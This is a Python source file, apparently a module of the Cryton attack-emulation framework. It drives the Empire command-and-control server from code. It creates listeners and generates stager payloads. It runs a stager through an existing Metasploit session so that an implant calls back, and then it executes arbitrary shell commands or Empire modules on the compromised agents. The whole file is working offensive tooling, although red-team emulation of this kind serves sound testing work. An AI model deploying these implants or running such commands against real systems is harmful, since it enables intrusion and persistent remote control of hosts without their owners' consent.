import asyncio
import time
from typing import Optional
import utinni
from httpx import TransportError

from cryton.worker.config.settings import SETTINGS
from cryton.worker.utility import logger
from cryton.lib.metasploit import MetasploitClientUpdated
from snek_sploit import Error as MSFError
from cryton.lib.utility.module import ModuleBase, ModuleOutput, Result


class EmpireClient(utinni.EmpireApiClient):
    def __init__(self, host: str = SETTINGS.empire.host, port: int = SETTINGS.empire.port):
        """
        Wrapper class for EmpireApiClient.
        :param host: Hostname(ip address) of Empire server
        :param port: Port used for connection to Empire server
        """
        super().__init__(host, port)
        self.stagers = EmpireStagers(self)

    async def login(self, username: str = SETTINGS.empire.username, password: str = SETTINGS.empire.password):
        """
        Login to Empire server
        :param username: Username used for login to Empire
        :param password: Password used for login to Empire
        """
        await try_empire_request(self.login, username, password)

    async def agent_poller(self, target_ip) -> Optional[utinni.EmpireAgent]:
        """
        Check for new agents in 1 sec interval until the right one is found.
        :param target_ip: IP address of target that agent should've been deployed to
        :return: Agent object
        """
        logger.logger.debug("* Waiting for agents...")
        previous_agents = []
        for check in range(10):
            for agent in await self.agents.get():
                for previous_agent in previous_agents:
                    if previous_agent.name == agent.name:
                        return agent
                logger.logger.debug(f"+ New agent '{agent.name}' connected from: {agent.external_ip}")
                if agent.external_ip == target_ip:
                    return agent
                previous_agents.append(agent)
                logger.logger.debug(f"agents:{previous_agents}")
            await asyncio.sleep(3)
        return None

    async def generate_payload(self, stager_arguments: dict, listener_arguments: dict) -> str:
        """
        Generate stager payload to generate agent on target.
        :param stager_arguments: Stager parameters
        :param listener_arguments: Listener parameters
        :return: Executable stager
        """
        listener_name = listener_arguments["name"]
        listener_port = listener_arguments.get("port", 80)
        listener_type = listener_arguments.get("type", "http")
        listener_options = listener_arguments.get("options", {})
        stager_type = stager_arguments["type"]
        stager_options = stager_arguments.get("options", {})

        # check if listener already exists
        listener_get_response = await try_empire_request(self.listeners.get, listener_name)
        logger.logger.debug(f"Using existing listener '{listener_name}'")
        if "error" in listener_get_response:
            # create listener
            logger.logger.debug("Creating listener.", listener_name=listener_name)
            try:
                await try_empire_request(
                    self.listeners.create,
                    listener_type,
                    listener_name,
                    additional={"Port": listener_port, **listener_options},
                )
            except KeyError:
                logger.logger.debug("Listener could not be created. Check if port is not already in use.")
                raise KeyError(f"Listener could not be created. Check if port is not already in use.")
            logger.logger.debug(f"Listener '{listener_name}' created")

        # check if stager is in Empire database
        stager = await try_empire_request(self.stagers.get, stager_type)
        logger.logger.debug("Generating stager output.", stager_type=stager_type, listener_name=listener_name)
        try:
            payload = await try_empire_request(stager.generate, stager_type, listener_name, stager_options)
        except KeyError:
            logger.logger.error(f"Stager could not be generated, check if the supplied listener exists.")
            raise KeyError(f"Stager could not be generated, check if the supplied listener exists.")

        logger.logger.debug("Stager output generated.")
        return payload

    async def execute_command_on_agent(self, agent_name: str, command: str):
        """
        Execute shell command on an agent.
        :param agent_name: Agent name
        :param command: Command
        :return: Output
        """
        await self.login()

        # There is timeout in execute/shell function but for some reason it's not triggered when inactive agent is used,
        # and it freezes waiting for answer
        try:
            agent = await try_empire_request(self.agents.get, agent_name)
        except KeyError:
            raise KeyError(f"Agent '{agent_name}' not found.")

        try:
            output = await asyncio.wait_for(try_empire_request(agent.shell, command), 300)
        except asyncio.exceptions.TimeoutError:
            logger.logger.error(f"Command execution timed out, check if agent '{agent_name}' is alive.")
            raise TimeoutError(f"Command execution timed out, check if agent '{agent_name}' is alive.")
        except Exception as ex:
            logger.logger.error("Error while executing shell command on agent", error=str(ex))
            raise ex

        return output

    async def execute_module_on_agent(self, agent_name: str, module_name: str, module_arguments: dict) -> str:
        """
        Execute an Empire module defined by name on an agent.
        :param agent_name: Agent name
        :param module_name: Module name
        :param module_arguments: Module arguments
        :return: Output
        """
        await self.login()

        # There is timeout in execute/shell function but for some reason it's not triggered when inactive agent is used,
        # and it freezes waiting for answer
        try:
            agent = await try_empire_request(self.agents.get, agent_name)
        except KeyError:
            raise KeyError(f"Agent '{agent_name}' not found.")

        # check if module exists
        try:
            await try_empire_request(self.modules.get, module_name)
        except KeyError:
            raise KeyError(f"Module '{module_name}' not found.")

        try:
            output = await asyncio.wait_for(try_empire_request(agent.execute, module_name, module_arguments), 300)
        except asyncio.exceptions.TimeoutError:
            logger.logger.error(f"Module execution timed out, check if agent '{agent_name}' is alive.")
            raise TimeoutError(f"Module execution timed out, check if agent '{agent_name}' is alive.")
        except Exception as ex:
            logger.logger.error("Error while executing empire module", error=str(ex))
            raise ex

        return output

    async def deploy_agent(
        self, agent_name: str, stager_arguments: dict, listener_arguments: dict, session_id: int
    ) -> str:
        """
        Deploy stager on target and create agent.
        :param agent_name: Agent name
        :param stager_arguments: Stager arguments
        :param listener_arguments: Listener arguments
        :param session_id: Metasploit session ID
        :return: output
        """
        await self.login()

        metasploit_obj = MetasploitClientUpdated()
        try:
            session_to_use = metasploit_obj.sessions.get(session_id)
        except MSFError as ex:
            logger.logger.error("MSF session not found.", session_id=session_id)
            raise KeyError(f"MSF Session with id {session_id} not found. {ex}")

        try:
            payload = await self.generate_payload(stager_arguments, listener_arguments)
        except KeyError as ex:
            raise ex

        target_ip = session_to_use.info.session_host
        logger.logger.debug(
            "Deploying agent via MSF session.", session_id=session_id, payload=payload, target_ip=target_ip
        )
        payload_tmp = payload.split()
        session_to_use.execute_in_shell(payload_tmp[0], payload_tmp[1:])

        # Rename agent to given name
        logger.logger.debug("Renaming agent", target_ip=target_ip)
        agent = await self.agent_poller(target_ip)

        if agent is None:
            raise Exception("Agent could not be deployed or didn't connect to the empire server")

        agent_rename_response = await try_empire_request(agent.rename, agent_name)
        logger.logger.debug(f"Agent renamed to '{agent.name}'", response=agent_rename_response)

        return f"Agent '{agent_name}' deployed on target {target_ip}."


class EmpireStager(utinni.EmpireObject):
    def __init__(self, api, raw_object):
        super().__init__(api, raw_object)

    async def generate(self, stager: str, listener: str, options: dict):
        return await self.api.stagers.generate(stager, listener, options)


class EmpireStagers(utinni.EmpireApi):
    async def get(self, stager: str):
        r = await try_empire_request(self.client.get, f"stagers/{stager}")
        return EmpireStager(self.api, r.json()["stagers"][0])

    async def generate(self, stager: str, listener: str, options: dict):
        r = await try_empire_request(
            self.client.post, "stagers", json={"StagerName": stager, "Listener": listener, **options}
        )
        return r.json()[stager]["Output"]


async def try_empire_request(fn_to_run, *fn_args, **fn_kwargs):
    """
    Try to execute empire function(REST API request), if TransportError happens, try again.
    :param fn_to_run: Empire function to execute
    :return: Passed function result
    """
    for i in range(4):
        try:
            return await fn_to_run(*fn_args, **fn_kwargs)
        except TransportError:
            logger.logger.debug("Connection error. Retrying...")
            time.sleep(1 + (i * 2))

    raise ConnectionError("Cannot connect to the Empire server")


class Module(ModuleBase):
    SCHEMA = {
        "type": "object",
        "description": "Arguments for the `hello_world` module.",
        "properties": {
            "action": {"type": "string", "enum": ["execute-command", "execute-module", "deploy"]},
            "agent_name": {"type": "string", "pattern": "^[a-zA-Z0-9]+$"},
        },
        "required": ["action", "agent_name"],
        "allOf": [
            {
                "if": {"properties": {"action": {"const": "execute-command"}}, "required": ["action"]},
                "then": {
                    "properties": {"command": {"type": "string"}},
                    "required": ["command"],
                },
            },
            {
                "if": {"properties": {"action": {"const": "execute-module"}}, "required": ["action"]},
                "then": {
                    "properties": {
                        "module": {
                            "type": "object",
                            "properties": {
                                "name": {"type": "string"},
                                "arguments": {"type": "object"},
                            },
                            "required": ["name"],
                            "additionalProperties": False,
                        },
                    },
                    "required": ["module"],
                },
            },
            {
                "if": {"properties": {"action": {"const": "deploy"}}, "required": ["action"]},
                "then": {
                    "properties": {
                        "session_id": {"type": "integer"},
                        "listener": {
                            "type": "object",
                            "properties": {
                                "name": {"type": "string"},
                                "port": {"type": "integer"},
                                "type": {"type": "string"},
                                "options": {"type": "object"},
                            },
                            "required": ["name"],
                        },
                        "stager": {
                            "type": "object",
                            "properties": {"type": {"type": "string"}, "options": {"type": "object"}},
                            "required": ["type"],
                        },
                    },
                    "required": ["listener", "stager", "session_id"],
                },
            },
        ],
    }

    def __init__(self, arguments: dict):
        super().__init__(arguments)

        self._action = self._arguments.get("action")
        self._agent_name = self._arguments.get("agent_name")
        self._listener = self._arguments.get("listener")
        self._stager = self._arguments.get("stager")
        self._session_id = self._arguments.get("session_id")
        self._command = self._arguments.get("command")
        self._module_name = self._arguments.get("module", {}).get("name")
        self._module_arguments = self._arguments.get("module", {}).get("arguments")

    def check_requirements(self) -> None:
        asyncio.run(EmpireClient().login())

    async def execute_async(self) -> str:
        empire = EmpireClient()
        if self._action == "execute-command":
            output = await empire.execute_command_on_agent(self._agent_name, self._command)
        elif self._action == "execute-module":
            output = await empire.execute_module_on_agent(self._agent_name, self._module_name, self._module_arguments)
        else:
            output = await empire.deploy_agent(self._agent_name, self._stager, self._listener, self._session_id)

        return output

    def execute(self) -> ModuleOutput:
        try:
            output = asyncio.run(self.execute_async())
        except Exception as ex:
            self._data.output = str(ex)
            return self._data

        self._data.result = Result.OK
        self._data.output = output
        return self._data
